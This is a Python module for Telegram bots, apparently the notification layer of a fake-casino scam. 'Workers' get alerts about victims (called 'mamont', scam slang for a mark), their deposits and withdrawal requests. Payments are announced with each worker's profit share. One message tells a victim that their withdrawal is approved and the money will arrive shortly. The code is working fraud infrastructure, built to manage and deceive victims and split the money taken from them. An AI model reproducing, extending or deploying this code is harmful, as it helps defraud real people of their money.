from telebot import types

def notification_new_ref(worker_id, sended_message):
	try:
		
		from worker_config import bot

		bot.send_message(worker_id, sended_message, parse_mode = 'html')

	except Exception as e:
		print(e)

def notification_to_receive(worker_id, mamont_id, sended_message):
	try:
		
		from worker_config import bot

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 2)
		inline_1 = types.InlineKeyboardButton(text = "Одобрить", callback_data = f'ACCEPT_CASINO_{mamont_id}')
		inline_2 = types.InlineKeyboardButton(text = "Отклонить", callback_data = f'CANCEL_CASINO_{mamont_id}')
		inline_keyboard.add(inline_1, inline_2)

		bot.send_message(worker_id, sended_message, parse_mode = 'html', reply_markup = inline_keyboard)

	except Exception as e:
		print(e)

def notification_new_deposit(worker_id, mamont_id, value, sended_message):
	try:
		
		from worker_config import bot

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "Оплатить", callback_data = f'DEPOSIT_CASINO_{mamont_id}_{value}')
		inline_keyboard.add(inline_1)

		bot.send_message(worker_id, sended_message, parse_mode = 'html', reply_markup = inline_keyboard)

	except Exception as e:
		print(e)

def notification_to_accept_receive(mamont_id):
	try:
		from casino_config import bot

		bot.send_message(mamont_id, 'Администрация одобрила <b>вывод</b>\nДенежные средства поступят в течение 5-10 минут', parse_mode = 'html')
	except Exception as e:
		print(e)

def notification_new_profit(worker_id, chat_workers, chat_channel, value, sended_message, username_worker, share):
	try:
		from worker_config import bot

		bot.send_message(worker_id, sended_message, parse_mode = 'html') # Сообщение воркеру
		bot.send_message(chat_workers, f'💞 Успешная <b>оплата</b>\n💸 Сумма платежа: <b>{value}</b> ₽\n👨‍💻 Воркер: {username_worker}', parse_mode = 'html') # Сообщение в чат

		inline_keyboard = types.InlineKeyboardMarkup(row_width = 1)
		inline_1 = types.InlineKeyboardButton(text = "Выплачено", callback_data = f'PAID')
		inline_keyboard.add(inline_1)

		bot.send_message(chat_channel, f'💞 Успешная <b>оплата</b>\nДоля воркера ~ <b>{share}</b>\n\n💸 Сумма платежа: <b>{value}</b> ₽\n👨‍💻 Воркер: {username_worker}', parse_mode = 'html',
		reply_markup = inline_keyboard) # Сообщение в канал

	except Exception as e:
		print(e)		

def sended_message_to_mamont(mamont_id, sended_message):
	try:
		from casino_config import bot

		bot.send_message(mamont_id, sended_message, parse_mode = 'html')
		
	except Exception as e:
		print(e)